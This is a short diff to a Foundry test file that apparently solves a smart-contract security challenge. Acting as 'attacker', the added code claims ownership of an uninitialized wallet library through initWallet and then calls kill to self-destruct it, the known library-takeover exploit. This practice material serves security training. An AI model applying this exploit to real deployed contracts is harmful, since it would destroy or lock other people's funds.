@@ -60,9 +60,15 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+        address[] memory owners = new address[](1);
+        owners[0] = attacker;
+        safuWalletLibrary.initWallet(owners, 1, type(uint).max);
+        safuWalletLibrary.kill(attacker);
+        // return true calling EOA as contract 
+        // (bool success, bytes memory returndata) = address(attacker).call(data);
+        // emit log_named_uint("b=", success ? 1 : 0 );    //b=1
 
         vm.stopPrank();
-
     }
 
     /// solves the challenge
